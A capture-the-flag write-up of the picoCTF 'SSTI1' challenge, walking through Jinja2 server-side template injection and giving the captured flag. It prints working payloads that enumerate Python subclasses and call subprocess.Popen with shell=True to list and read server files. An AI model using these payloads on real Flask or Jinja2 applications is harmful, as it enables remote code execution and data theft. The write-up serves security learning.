# üß© CTF Challenge Writeup  
**Challenge Name:** SSTI1  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF 2025 (picoMini by CMU-Africa)  
**Author:** Venax  
**Date:** 13-01-26

---

## üîç 1. Challenge Description
The challenge provides a web application where users can announce arbitrary messages.
The description hints that the application uses **server-side templating** to render user input.

A hint explicitly mentions **Server Side Template Injection (SSTI)**, suggesting that user input is evaluated directly by the template engine.

The goal is to exploit this vulnerability and retrieve the hidden flag.

---

## üß† 2. Initial Thoughts / Approach
Given the **Web Exploitation** category and *Easy* difficulty, the likely scenario is:
- A Flask-based web application
- Jinja2 used as the template engine
- User input rendered without proper sanitization

The intended approach is:
1. Confirm SSTI
2. Identify the template engine
3. Abuse object traversal to achieve code execution
4. Read the flag from the server

---

## üõ†Ô∏è 3. Steps to Solve

### 3.1 Confirm SSTI
To test for SSTI, the following payload was entered into the announcement field:

```jinja
{{7*7}}
```
The page rendered:
```yaml
49
```
### 3.2 Enumerate Python objects
To explore accessible Python objects, the following payload was used:
```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
```
This returned a large list of Python classes, confirming:
- Access to the Python object hierarchy
- Weak or absent sandboxing

Among the listed classes was:
```js
<class 'subprocess.Popen'>
```
### 3.3 Identify subprocess.Popen index
Dumping all subclasses at once caused an internal server error due to excessive output.
Instead, the output was filtered to locate Popen safely:
```jinja
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if 'Popen' in c.__name__ %}
{{ loop.index0 }} : {{ c }}
{% endif %}
{% endfor %}
```
This revealed:
```yaml
356 : <class 'subprocess.Popen'>
```
### 3.4 Achieve command execution
Using the discovered index, system commands could now be executed:
```jinja
{{''.__class__.__mro__[1].__subclasses__()[356](
  'ls',
  shell=True,
  stdout=-1
).communicate()[0].decode()}}
```
Output:
```yaml
__pycache__  app.py  flag  requirements.txt
```
This confirmed full remote code execution.
### 3.5 Read the flag
Since a file named flag exists, it can be read directly:
```jinja
{{''.__class__.__mro__[1].__subclasses__()[356](
  'cat flag',
  shell=True,
  stdout=-1
).communicate()[0].decode()}}
```

---
## üß©  4. Final Flag 
```bash
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
```

---
## üìö 5. Key Learnings
- Server-Side Template Injection can lead to full remote code execution
- Jinja2 allows deep object traversal when unsandboxed
- Printing large outputs may crash the server; filtering is safer
- Debug or development configurations are extremely dangerous in production
- SSTI vulnerabilities are often more severe than SQL injection

---
## üöÄ 6. Improvements for Next Time
- Always test {{7*7}} when SSTI is suspected
- Learn common Jinja2 exploitation paths (__mro__, __subclasses__)
- Filter large outputs to avoid server errors
- Maintain a checklist of SSTI exploitation techniques
- Practice sandbox bypass techniques for harder challenges

---
## üîó 7. References
- OWASP: Server-Side Template Injection
- Jinja2 Template Engine Documentation
- picoCTF Web Exploitation Challenges
- PayloadsAllTheThings ‚Äì SSTI